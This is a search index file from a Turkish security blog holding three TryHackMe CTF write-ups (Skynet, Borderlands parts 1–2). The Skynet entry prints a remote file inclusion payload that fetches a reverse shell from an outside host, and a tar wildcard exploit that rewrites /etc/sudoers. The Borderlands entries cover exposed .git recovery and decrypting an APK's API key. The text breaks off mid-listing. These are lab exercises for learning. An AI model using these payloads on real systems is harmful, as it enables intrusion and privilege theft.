<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>THM Skynet Çözüm</title>
      <link href="/2022/03/20/THM-Skynet-Cozum/"/>
      <url>/2022/03/20/THM-Skynet-Cozum/</url>
      
        <content type="html"><![CDATA[<p><a href="https://tryhackme.com/room/skynet">Makine Linki</a></p><h1 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h1><hr><p>Nmap taramasıyla makineyı çözümlemeye naşlıyorum.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV 10.10.104.98</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-03-20 15:59 +03</span><br><span class="line">Nmap scan report for 10.10.104.98</span><br><span class="line">Host is up (0.087s latency).</span><br><span class="line">Not shown: 994 closed ports</span><br><span class="line">PORT    STATE SERVICE     VERSION</span><br><span class="line">22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">110/tcp open  pop3        Dovecot pop3d</span><br><span class="line">139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">143/tcp open  imap        Dovecot imapd</span><br><span class="line">445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</span><br><span class="line">Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 14.11 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Nmap çıktısından makinede birçok farklı servisin çalıştığını gözlemledim. Bu kadar çok servis çalışması atak vektörlerinin olasılıklarını arttırıyor. Özellikle pop3 ve smb servisleri muhtemel bir atak vektörü oluşturabilir.</p><span id="more"></span><p>İlk önce web sunucusuna bakacağım. 80 portunda servis edilen bir apache web sunucu var. Sunucudaki alt dizinler işime yarayabilir. Alt dizinleri listelemek için <code>dirb http://10.10.104.98</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GENERATED WORDS: 4612                                                          </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://10.10.104.98/ ----</span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.98/admin/                                      </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.98/config/                                     </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.98/css/                                        </span><br><span class="line">+ http://10.10.104.98/index.html (CODE:200|SIZE:523)                           </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.98/js/                                         </span><br><span class="line">+ http://10.10.104.98/server-status (CODE:403|SIZE:277)                        </span><br><span class="line">==&gt; DIRECTORY: http://10.10.104.98/squirrelmail/                               </span><br></pre></td></tr></table></figure><p>Sunucudaki <code>squirrelmail</code> alt dizini bir mail servisi barındırıyor. Bu daha sonra işime yarayabilir.</p><p>Port taramasında açık olan smb servisini de analiz etmek akıllıca olacaktır. Smb servisin daha detaylı analiz etmek için enum4linux kullanabilirim. <code>enum4linux 10.10.104.98</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> ========================================= </span><br><span class="line">|    Share Enumeration on 10.10.104.98    |</span><br><span class="line"> ========================================= </span><br><span class="line"></span><br><span class="line">Sharename       Type      Comment</span><br><span class="line">---------       ----      -------</span><br><span class="line">print$          Disk      Printer Drivers</span><br><span class="line">anonymous       Disk      Skynet Anonymous Share</span><br><span class="line">milesdyson      Disk      Miles Dyson Personal Share</span><br><span class="line">IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))</span><br><span class="line">SMB1 disabled -- no workgroup available</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></br><p>anonymous ve milesdyson dosya paylaşımları işime yarayabilir ve <code>anonymous</code> paylaşımına şifre olmadan da erişebilirim.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient &#x27;\\10.10.104.98\anonymous&#x27;</span><br></pre></td></tr></table></figure><p>Smb ile bağlantı kurduktan sonra dizinde yer alan dosyaları get komutuyla kendi makineme çekebilirim. <code>get attention.txt</code>. Log dosyalarına bir göz atmak mantıklı olacak.</p><p>Dosyaları çekikten sonra içeriklerine baktığımda <code>log1.txt</code> içinde şifre olarak kullanabileceğim string’ler mevcut. <code>attention.txt</code> içinde de Miles Dyson tarafından skynet çalışanlarına yazılmış bir not var. Miles Dyson ismi smb taramasında çıkan <code>milesdyson</code> dosya paylaşımıyla da ismen uyuşuyor.</p><p>Şimdiye kadar bulduğum login formu olan tek sayfa <code>squirrelmail</code>. Milesdyson ve <code>log1.txt</code> içindeki şifreleri giriş formunda deneyebilirim. İlk şifreyi deniyorum ve giriş başarılı. <code>skynet@skynet</code> tarafından gönderilen mailde milesdyson abimizin smb şifresini sıfırladıkları ve şifrenin ta kendisi yazıyor.</p><p>milesdyson olarak smb servisine login<code>(smbclient -U milesdyson \\\\10.10.104.98\\milesdyson )</code> olduktan sonra dosya sisteminde gezindiğimde notes dizinin altında important.txt diğer dosyaların arasında hemen fark ediliyor. <code>important.txt</code> dosyasını kendi makinememde açtığımda <code>/45kra24zxs28v3yd</code> altında CMS bulunduğu ve beta aşamasında olduğunu anlıyorum.</p><p>Tarayıcımda <code>10.10.104.98/45kra24zxs28v3yd</code> açtığımda işe yarar bir şey bulamadım. CMS’in login sayfasını manuel olarak denerken <code>administrator</code> ‘da olumlu dönüt aldım. Cuppa CMS için olası exploitleri arattığımda ilk karşıma çıkan şey <a href="https://www.exploit-db.com/exploits/25971">File Inclusion</a>. Exploit basitçe alerts/alertConfigField.php içindeki bulunan aşşağıdaki koddan doğuyor.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php include($_REQUEST[&quot;urlConfig&quot;]); ?&gt;</span><br></pre></td></tr></table></figure></br><h1 id="EXPLOITATION"><a href="#EXPLOITATION" class="headerlink" title="EXPLOITATION"></a>EXPLOITATION</h1><hr><p>Exploit’in açıklandığı yazının devamında aşşağıdaki payload ile zafiyeti sömürebileceğimden bahsediliyor.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://target/cuppa/alerts/alertConfigField.php?urlConfig=http://www.shell.com/shell.txt?</span><br></pre></td></tr></table></figure><p>İlk önce php için bir <a href="https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php">reverse shell</a> lazım. Ardından dosyayı kendi ip ve port değerlerim ile değiştiriyorum. Port için 1234 seçtim ve <code>nc -lvnp 1234</code> ile dinlemeye aldım. Reverse shell’in bulunduğu dizinde <code>python3 -m SimpleHTTPServer</code> ile bir sunucu servis etmeye başlıyorum ki hedef makina shell kodunu çekebilsin.</p><p>Artık tek yapmam gereken tarayıcımda aşşağıdaki adrese gitmek.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">10.10.73.140/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.66.44:8000/shell.php?</span><br></pre></td></tr></table></figure><h1 id="PRIV-ESC"><a href="#PRIV-ESC" class="headerlink" title="PRIV ESC"></a>PRIV ESC</h1><hr><p>Artık kendi makinamda shell aldım. Priv esc denerken ilk denediğim iki şey genelde <code>sudo -l</code> ve <code>cat /etc/crontab</code>. Sudo’dan bir şey çıkmadı fakat crontab’de her dakika çalıştırılan bir dosya var(/home/milesdyson/backups/backup.sh). </p><p>Backup dosyasının işlevi /var/www/html dizininin hepsini sıkıştırmak ve miles’ın home dizinine kaydetmek ve bu işlem root kullanıcısı tarafından gerçekleştiriliyor. Biraz araştırma yaptıktan sonra bu <a href="https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/">yazıya</a> denk geldim. Yazıda backup.sh içindeki <code>tar cf /home/milesdyson/backups/backup.tgz *</code> satırındaki “*” karakterinden doğabilecek bir yetki yükseltme tekniği anlatılıyor.</p><p>Yazıda anlatılan yöntemi deniyorum.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo ‘echo “www-data ALL=(root) NOPASSWD: ALL” &gt; /etc/sudoers’ &gt; privesc.sh</span><br><span class="line">echo “/var/www/html” &gt; “–checkpoint-action=exec=sh privesc.sh”</span><br><span class="line">echo “/var/www/html” &gt; –checkpoint=1</span><br></pre></td></tr></table></figure><p>Birkaç dakika bekledikten sonra <code>sudo bash</code> yolladığımda root yetkilerini almış oldum.</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>THM Borderlands Çözüm Bölüm-2</title>
      <link href="/2022/02/27/THM-Borderlands-Cozum-Bolum-2/"/>
      <url>/2022/02/27/THM-Borderlands-Cozum-Bolum-2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://tryhackme.com/room/borderlands">Makine Linki</a></p><h1 id="APK-FLAG"><a href="#APK-FLAG" class="headerlink" title="APK FLAG"></a>APK FLAG</h1><hr><p>Web sitesinin başında <code>News: We are looking for Android BETA testers for the new Mobile App Prototype, please download from here. </code> yazısı vardı. Yazıda bahsedilen apk dosyasını indirdim. Dosyayı, apk dosyalarını decompile etmekte kullanılan <code>apktool</code> ile decode ettim.</p><pre><code>apktool d mobile-app-prototype.apk</code></pre><p>Decompile ettikten sonra işimize yarayacak value <code>api_key</code>. Api key’i bulmak için:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ grep -rn encrypted_api_key</span><br><span class="line">İkilik dosya resources.arsc eşleşir</span><br><span class="line">İkilik dosya mobile-app-prototype.apk eşleşir</span><br><span class="line">mobile-app-prototype/smali/com/example/ctf1/R$string.smali:98:.field public static final encrypted_api_key:I = 0x7f0b0028</span><br><span class="line">mobile-app-prototype/res/values/strings.xml:43:    &lt;string name=&quot;encrypted_api_key&quot;&gt;CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo&lt;/string&gt;</span><br><span class="line">mobile-app-prototype/res/values/public.xml:892:    &lt;public type=&quot;string&quot; name=&quot;encrypted_api_key&quot; id=&quot;0x7f0b0028&quot; /&gt;</span><br><span class="line">İkilik dosya classes.dex eşleşir</span><br></pre></td></tr></table></figure><p>Api key’in encrypted hali artık elimde. </p><pre><code>CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</code></pre><span id="more"></span><p>İlk bölümde bahsettiğim ve içinde flag olan <code>api.php</code> içinde de plaintext halde api_key bulunuyor:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once(&quot;functions.php&quot;);</span><br><span class="line"></span><br><span class="line">if (!isset($_GET[&#x27;apikey&#x27;]) || ((substr($_GET[&#x27;apikey&#x27;], 0, 20) !== &quot;WEBLhvOJAH8d50Z4y5G5&quot;) &amp;&amp; substr($_GET[&#x27;apikey&#x27;], 0, 20) !== &quot;ANDVOWLDLAS5Q8OQZ2tu&quot; &amp;&amp; substr($_GET[&#x27;apikey&#x27;], 0, 20) !== &quot;GITtFi80llzs4TxqMWtCotiTZpf0HC&quot;))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;Invalid API key&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (!isset($_GET[&#x27;documentid&#x27;]))</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;Invalid document ID&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line">if (!isset($_GET[&#x27;newname&#x27;]) || $_GET[&#x27;newname&#x27;] == &quot;&quot;)</span><br><span class="line">&#123;</span><br><span class="line">    die(&quot;invalid document name&quot;);</span><br><span class="line">&#125;</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line">$conn = setup_db_connection();</span><br><span class="line"></span><br><span class="line">//UpdateDocumentName($conn, $_GET[&#x27;documentid&#x27;], $_GET[&#x27;newname&#x27;]);</span><br><span class="line"></span><br><span class="line">$docDetails = GetDocumentDetails($conn, $_GET[&#x27;documentid&#x27;]);</span><br><span class="line">if ($docDetails !== null)</span><br><span class="line">&#123;</span><br><span class="line">    //print_r($docDetails);</span><br><span class="line">    echo (&quot;Document ID: &quot;.$docDetails[&#x27;documentid&#x27;].&quot;&lt;br /&gt;&quot;);</span><br><span class="line">    echo (&quot;Document Name: &quot;.$docDetails[&#x27;documentname&#x27;].&quot;&lt;br /&gt;&quot;);</span><br><span class="line">    echo (&quot;Document Location: &quot;.$docDetails[&#x27;location&#x27;].&quot;&lt;br /&gt;&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Yani elimde artık plaintext ve encrypted halde iki string var.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ANDVOWLDLAS5Q8OQZ2tu</span><br><span class="line">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Peki hangi algoritmayla encode edilmiş? İki string’de de rakamların yerleri aynı bu da demek oluyor ki ya sezar ya da vigenere kullanılmış. </p><p>Bu adım çok gerekli değil deneyerek bulabilirim ama ileriki araştırmalarınızda kullanabileceğiniz bir programı da kullanmak istiyorum. <a href = "https://github.com/skylot/jadx">jadx</a>, Mobil uygulamanın çalışma prensibini daha iyi anlamak için jadx-gui kullanabilirim. Jadx üzerinde apk dosyasını açtığımda Source code altında <code>com.example.ctf1</code> ve bunun altında da iki tane <code>MainActivity</code> dosyası var. Bu dosyalar aslında adından da anlaşılacağı gibi programın build edilip çalıştırıldığında yaptığı temel davranışları gösteriyor.</p><p>Main2Activity dosyasını açtığımda:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">package com.example.ctf1;</span><br><span class="line"></span><br><span class="line">import android.os.Bundle;</span><br><span class="line">import androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"></span><br><span class="line">/* loaded from: classes.dex */</span><br><span class="line">public class Main2Activity extends AppCompatActivity &#123;</span><br><span class="line">    String apiKey;</span><br><span class="line">    String apiPath;</span><br><span class="line"></span><br><span class="line">    /* JADX INFO: Access modifiers changed from: protected */</span><br><span class="line">    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span><br><span class="line">    public void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main2);</span><br><span class="line">        this.apiKey = decrypt(getString(R.string.encrypted_api_key), &quot;#TODO&quot;);</span><br><span class="line">        this.apiPath = &quot;/api.php?documentid=&#123;&#125;&amp;apikey=&quot; + this.apiKey;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected String decrypt(String encrypted_key, String encryption_key) &#123;</span><br><span class="line">        return &quot;NOT_IMPLEMENTED&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Aşağıdaki satırda algoritmanın encryption_key kullandığı bariz. Yani sezar olamaz.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">protected String decrypt(String encrypted_key, String encryption_key) &#123;</span><br><span class="line">        return &quot;NOT_IMPLEMENTED&quot;;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>Bu key’i bulmamız lazım. Bulmak için bir vigenere tablosu lazım<br><img src="https://www.researchgate.net/profile/Partha-Chakraborty-10/publication/342474014/figure/fig1/AS:906657022345216@1593175287161/The-Original-26-26-Vigenere-table-13-The-encryption-equation-E-for-a-Vigenere.jpg"></p><p>Key’i çözmek artık daha basit. Soldaki sütün plaintext string’deki her bir harfi, üstteki satır ise bulmak istediğimiz key’in her bir harfine karşılık geliyor. Encrypted string ise bu ikisinin çakışmasında olan harf. Yani:</p><img src="http://www.vdv-project.fr/icn-palissy-tom/wp-content/uploads/2018/03/tableau_de_Vigen%C3%A8re.png"><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ANDVOWLDLAS5Q8OQZ2tu</span><br><span class="line">CBQOSTEFZNL5U8LJB2hhBTDvQi2zQo</span><br></pre></td></tr></table></figure><p>Bu iki string için bu işlemleri tek tek yaptığımda ortaya çıkan key <code>CONTEXT</code>. Artık elimde key olduğuna göre <a href= "https://www.boxentriq.com/code-breaking/vigenere-cipher">bu siteden</a> encrypted string’i ve key’i kullanarak decrpyt edebilirim. </p>]]></content>
      
      
      <categories>
          
          <category> CTF Çözüm </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Reverse Engineering </tag>
            
            <tag> Apk Analysis </tag>
            
            <tag> Cryptography </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>THM Borderlands Çözüm Bölüm-1</title>
      <link href="/2022/02/25/THM-Borderlands/"/>
      <url>/2022/02/25/THM-Borderlands/</url>
      
        <content type="html"><![CDATA[<p><a href="https://tryhackme.com/room/borderlands">Makine Linki</a></p><h1 id="GIT-ve-WEB-FLAG"><a href="#GIT-ve-WEB-FLAG" class="headerlink" title="(GIT ve WEB FLAG)"></a>(GIT ve WEB FLAG)</h1><hr><h1 id="RECON"><a href="#RECON" class="headerlink" title="RECON"></a>RECON</h1><hr><p>Detaylı bir nmap taramsıyla makineyi çözümlemeye başlıyorum. <code>nmap -sS -sV -sC 10.10.213.229</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-25 23:37 +03</span><br><span class="line">Nmap scan report for 10.10.213.229</span><br><span class="line">Host is up (0.091s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80/tcp   open   http       nginx 1.14.0 (Ubuntu)</span><br><span class="line">8080/tcp closed http-proxy</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 15.50 seconds</span><br><span class="line">root@h4ckmachine:/# nmap -sS -sV -sC 10.10.213.229</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2022-02-25 23:42 +03</span><br><span class="line">Nmap scan report for 10.10.213.229</span><br><span class="line">Host is up (0.086s latency).</span><br><span class="line">Not shown: 997 filtered ports</span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">22/tcp   open   ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 f6:50:6e:5a:6f:05:7b:ea:04:26:95:02:e5:a4:a6:37 (RSA)</span><br><span class="line">|   256 09:d4:4c:c1:c2:e9:aa:b0:f9:14:73:88:8f:7a:e0:ab (ECDSA)</span><br><span class="line">|_  256 f1:34:69:76:df:83:3b:78:2d:04:a6:5e:ba:00:b5:4b (ED25519)</span><br><span class="line">80/tcp   open   http       nginx 1.14.0 (Ubuntu)</span><br><span class="line">| http-cookie-flags: </span><br><span class="line">|   /: </span><br><span class="line">|     PHPSESSID: </span><br><span class="line">|_      httponly flag not set</span><br><span class="line">| http-git: </span><br><span class="line">|   10.10.213.229:80/.git/</span><br><span class="line">|     Git repository found!</span><br><span class="line">|     .git/config matched patterns &#x27;user&#x27;</span><br><span class="line">|     Repository description: Unnamed repository; edit this file &#x27;description&#x27; to name the...</span><br><span class="line">|_    Last commit message: added mobile apk for beta testing. </span><br><span class="line">|_http-server-header: nginx/1.14.0 (Ubuntu)</span><br><span class="line">|_http-title: Context Information Security - HackBack 2</span><br><span class="line">8080/tcp closed http-proxy</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 17.42 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>80 portunda çalışan bir nginx web sunucu var ayrıca 8080 portunda kapalı durumda bir http-proxy var.</p><span id="more"></span> </br><p>Nmap, Web sunucusunda bir git repo’su buldu. Web tarayıcımda açtığımda <code>403 FORBIDDEN ERROR </code> aldım. Google’da <code>.git folder exploit 403 forbidden</code> şeklinde arattığımda <a href = "https://pentester.land/tutorials/2018/10/25/source-code-disclosure-via-exposed-git-folder.html">bu siteye</a> denk geldim. Yazının <code>Confirm the bug by manually browsing the .git folder</code> kısmında her git projesinde <code>.git</code> klasörünün içinde ortak olarak bulunan bazı dosyaları açabildiğim takdirde klasör içeriğinin tarafımca erişilebilir olduğunu kanıtlayabileceğim yazıyor.</p></br><h1 id="EXPLOITATION"><a href="#EXPLOITATION" class="headerlink" title="EXPLOITATION"></a>EXPLOITATION</h1><hr><p>Yazıda bahsedilen metotlar çalışıyor. <code>10.10.4.224/.git/logs/HEAD</code> dizinindeki dosyayı indirdiğimde:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0000000000000000000000000000000000000000 152b2d9976cd37a68fd462af8e4ce21356b5485e Context Information Security &lt;recruitment@contextis.com&gt; 1568122271 +0100commit (initial): created repo</span><br><span class="line">152b2d9976cd37a68fd462af8e4ce21356b5485e 93bab0a450caaa8c4d2632703636eccc69062bb4 Context Information Security &lt;recruitment@contextis.com&gt; 1568122438 +0100commit: added under construction page</span><br><span class="line">93bab0a450caaa8c4d2632703636eccc69062bb4 79c9539b6566b06d6dec2755fdf58f5f9ec8822f Context Information Security &lt;recruitment@contextis.com&gt; 1568122828 +0100commit: added basic prototype of api gateway</span><br><span class="line">79c9539b6566b06d6dec2755fdf58f5f9ec8822f b2f776a52fe81a731c6c0fa896e7f9548aafceab Context Information Security &lt;recruitment@contextis.com&gt; 1568122860 +0100commit: removed sensitive data</span><br><span class="line">b2f776a52fe81a731c6c0fa896e7f9548aafceab 04f1f411857cc972ae8ed5efcffa298f5f6168fb Context Information Security &lt;recruitment@contextis.com&gt; 1568122932 +0100commit: added theme</span><br><span class="line">04f1f411857cc972ae8ed5efcffa298f5f6168fb fee5595bb2ba1d1ab005ec3de98367fe5d021e9f Context Information Security &lt;recruitment@contextis.com&gt; 1568123006 +0100commit: added white paper pdf&#x27;s</span><br><span class="line">fee5595bb2ba1d1ab005ec3de98367fe5d021e9f 6db3cf70b469de942f2f529166088cdfbbd5f764 Context Information Security &lt;recruitment@contextis.com&gt; 1568123071 +0100commit: added mobile apk for beta testing.</span><br></pre></td></tr></table></figure><pre><code>79c9539b6566b06d6dec2755fdf58f5f9ec8822f b2f776a52fe81a731c6c0fa896e7f9548aafceab Context Information Security &lt;recruitment@contextis.com&gt; 1568122860 +0100    commit: removed sensitive data</code></pre><p>Bu satır önemli çünkü commit açıklaması <code>removed sensitive data</code>. </p></br><p>Satırların başındaki SHA1 hash’ler aslında git objeleri’nin sıkıştırılmış halleri. Az önce önemli olarak bahsettiğim satırdaki ilk hash, üzerinden hassas bilgi silinen obje. İkinci hash ise muhtemelen silinen bilgi. </p></br><p>Bu objelerin içeriğini okumak artık zor değil. Hashlerin ilk iki karakteri objelerin içinde bulunduğu dosya adları. Bu yüzden web tarayıcımda<br>    <a href="http://10.10.4.224/.git/objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f">http://10.10.4.224/.git/objects/79/c9539b6566b06d6dec2755fdf58f5f9ec8822f</a><br>adresine gittiğimde obje dosyasına da ulaşmış oluyorum. <code>c9539b6566b06d6dec2755fdf58f5f9ec8822f</code> dosyasını indiriyorum. Ardından kendi makinemde <code>git init</code> ile bir <code>.git</code> dosyası oluşturuyorum ve objects klasörü içinde <code>mkdir 79</code> komutuyla yeni bir dizin oluşurup içine indirdiğim c9539b6566b06d6dec2755fdf58f5f9ec8822f dosyasını kopyalıyorum. Dosya içeriğini görmek için tek yapmam gereken <code> git cat-file -p c9539b6566b06d6dec2755fdf58f5f9ec8822f</code>. </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tree 51d63292792fb7f97728cd3dcaac3ef364f374ba</span><br><span class="line">parent 93bab0a450caaa8c4d2632703636eccc69062bb4</span><br><span class="line">author Context Information Security &lt;recruitment@contextis.com&gt; 1568122828 +0100</span><br><span class="line">committer Context Information Security &lt;recruitment@contextis.com&gt; 1568122828 +0100</span><br><span class="line"></span><br><span class="line">added basic prototype of api gateway</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>tree hash bana dosya hiyerarşisini gösterecek bu yüzden önceki adımların aynısını tekrarlıyorum.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">100644 blob 2229eb414d7945688b90d7cd0a786fd888bcc6a4api.php</span><br><span class="line">100644 blob 9eb9f94f73113d785e65c7e3ec0cba54e0b7cf43functions.php</span><br><span class="line">100644 blob 2a116a56a6e31ef1836796936dbc05af1f986a26home.php</span><br><span class="line">100755 blob 470cac65fcd0f8556f13997957a331628482aa96index.html</span><br><span class="line">100644 blob 